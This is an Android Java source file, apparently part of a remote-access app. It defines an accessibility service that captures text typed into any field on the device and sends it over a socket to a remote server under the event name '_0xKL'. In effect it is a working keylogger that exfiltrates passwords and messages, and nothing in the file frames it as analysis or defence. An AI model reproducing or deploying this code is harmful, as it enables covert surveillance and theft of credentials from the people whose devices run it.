package com.remote.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.remote.app.socket.IOSocket;

public class CustomAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                String msg = event.getText().toString();
                eventText = msg.substring(1, msg.length() - 1);
                System.out.println("ACCESSIBILITY SERVICE : " + eventText);

                //todo check
                IOSocket.getInstance().send("_0xKL", eventText);
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.d("acess", "stopd");
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;

        this.setServiceInfo(info);
    }

}
